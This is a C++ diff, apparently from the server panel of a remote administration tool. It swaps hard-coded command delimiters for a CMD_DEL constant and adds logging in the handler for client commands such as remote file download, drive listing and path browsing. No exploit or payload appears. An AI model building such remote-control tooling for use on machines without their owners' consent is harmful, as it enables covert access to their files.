@@ -37,7 +37,10 @@ void Cliente_Handler::Spawn_Handler(){
             break;
         }
 
-        std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 1);
+
+        this->Log(cBuffer);
+
+        std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 1);
         if (vcDatos.size() == 0) {
             this->Log("No se pudo procesar el buffer");
             continue;
@@ -45,7 +48,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         //Prioridad para descarga de archivos
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
-            vcDatos = strSplit(std::string(cBuffer), '\\', 2);
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 2);
             // CMD + 2 slashs /  +len del id
             int iHeader = 5 + vcDatos[1].size();
             char* cBytes = cBuffer + iHeader;
@@ -62,7 +65,7 @@ void Cliente_Handler::Spawn_Handler(){
             continue;
         }
 
-        vcDatos = strSplit(std::string(cBuffer), '\\', 5);
+        vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 5);
 
         //Pquete inicial
         if (vcDatos[0] == "01") {
@@ -140,7 +143,7 @@ void Cliente_Handler::Spawn_Handler(){
 
         if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
             char* pBuf = cBuffer + 4;
-            std::vector<std::string> vDrives = strSplit(std::string(pBuf), '\\', 100);
+            std::vector<std::string> vDrives = strSplit(std::string(pBuf), CMD_DEL, 100);
 
             if (vDrives.size() > 0) {
                 ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
@@ -205,7 +208,7 @@ void Cliente_Handler::Spawn_Handler(){
             if (temp_panel) {
                 temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer + 4));
                 temp_panel->c_RutaActual.clear();
-                std::vector<std::string> vcSubRutas = strSplit(cBuffer + 4, '\\', 100);
+                std::vector<std::string> vcSubRutas = strSplit(cBuffer + 4, CMD_DEL, 100);
                 for (auto item : vcSubRutas) {
                     std::string strTemp = item;
                     strTemp += "\\";
@@ -236,6 +239,7 @@ void Cliente_Handler::Spawn_Handler(){
             }
             continue;
         }
+
     }
 
     if (cBuffer) {
@@ -495,7 +499,7 @@ void Servidor::m_Ping(){
                 if (!it->second._isBusy) {
                     //Si no esta activo enviar el ping
                     std::string strData = std::to_string(EnumComandos::PING);
-                    strData.append(1, '~');
+                    strData.append(1, CMD_DEL);
                     int iBytes = this->cSend(it->second._sckCliente, strData.c_str(), strData.size(), 0, false);
                     if (iBytes <= 0) {
                         //No se pudo enviar el ping
